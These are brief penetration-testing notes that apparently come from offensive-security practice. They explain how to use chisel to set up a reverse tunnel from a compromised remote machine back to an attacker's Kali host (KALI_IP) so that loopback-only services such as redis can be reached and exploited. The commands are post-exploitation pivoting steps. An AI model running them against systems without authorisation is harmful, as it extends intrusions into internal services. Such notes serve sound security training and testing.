Tunneling examples

Scenario: We have a shell on a remote machine and we need to reach a service listening on loopback port (typical examples redis, or internal API)
Download chisel binary (for Linux)

On local machine (our Kali box), start a chisel server on an unused port (i.e. 5454)
chisel server -p 5454 --reverse

On the remote machine (with the service on loopback port 8000):
./chisel client KALI_IP:5454 R:8000:127.0.0.1:8000

The two chisel instances will establish a tunnel.

Connections to our Kali 127.0.0.1:8000 will be tunneled to 127.0.0.1 on the remote machine.

We can then launch our enumarations or exploits to 127.0.0.1:8000
